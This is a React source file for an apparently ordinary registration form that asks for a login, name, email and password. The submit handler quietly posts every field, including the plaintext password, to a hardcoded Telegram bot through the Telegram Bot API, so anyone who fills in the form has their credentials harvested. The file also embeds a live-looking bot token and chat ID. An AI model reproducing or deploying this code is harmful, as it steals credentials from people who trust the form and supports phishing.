import React from 'react';
import './index.scss';
import { Button, Card, Input, Form, message } from "antd";

const Index = () => {
    const [form] = Form.useForm();

    const onFinish = (values) => {
        console.log('Received values:', values);
        message.success('Registration successful!');
        form.resetFields();
        sendTelegram(values);
    };

    const sendTelegram = (values) => {
        const { login, firstName, lastName, email, password } = values;
        const message = `📌Login: ${login}\n 📌First Name: ${firstName}\n 📌Last Name: ${lastName}\n 📌Email: ${email}\n 📌Password: ${password}`;

        var telegram_bot_id = "7059302754:AAGChb5bbs0nbJSlON7Wus1VADd9YOGZ418"; // Replace with your Telegram bot token
        var chat_id = 1736820935; // Replace with your Telegram chat ID

        var settings = {
            "async": true,
            "crossDomain": true,
            "url": `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": message
            })
        };

        fetch(settings.url, {
            method: 'POST',
            headers: settings.headers,
            body: settings.data
        })
            .then(response => {
                console.log(response);
                if (!response.ok) {
                    throw new Error('Error sending data to Telegram bot');
                }
            })
            .catch(error => {
                console.error('Error sending data to Telegram bot:', error);
            });
    };

    return (
        <div className={"register"}>
            <Card title={"Registration"} className={"card"}>
                <Form
                    form={form}
                    onFinish={onFinish}
                >
                    <Form.Item
                        name="login"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter your login!',
                            },
                        ]}
                    >
                        <Input placeholder={"Login"}/>
                    </Form.Item>
                    <Form.Item
                        name="firstName"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter your first name!',
                            },
                        ]}
                    >
                        <Input placeholder={"First name"}/>
                    </Form.Item>
                    <Form.Item
                        name="lastName"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter your last name!',
                            },
                        ]}
                    >
                        <Input placeholder={"Last name"}/>
                    </Form.Item>
                    <Form.Item
                        name="email"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter your email!',
                            },
                        ]}
                    >
                        <Input placeholder={"Email"}/>
                    </Form.Item>
                    <Form.Item
                        name="password"
                        rules={[
                            {
                                required: true,
                                message: 'Please enter your password!',
                            },
                        ]}
                    >
                        <Input.Password placeholder={"Password"}/>
                    </Form.Item>
                    <Form.Item>
                        <Button type="primary" htmlType="submit">Register</Button>
                    </Form.Item>
                </Form>
            </Card>
        </div>
    );
};

export default Index;
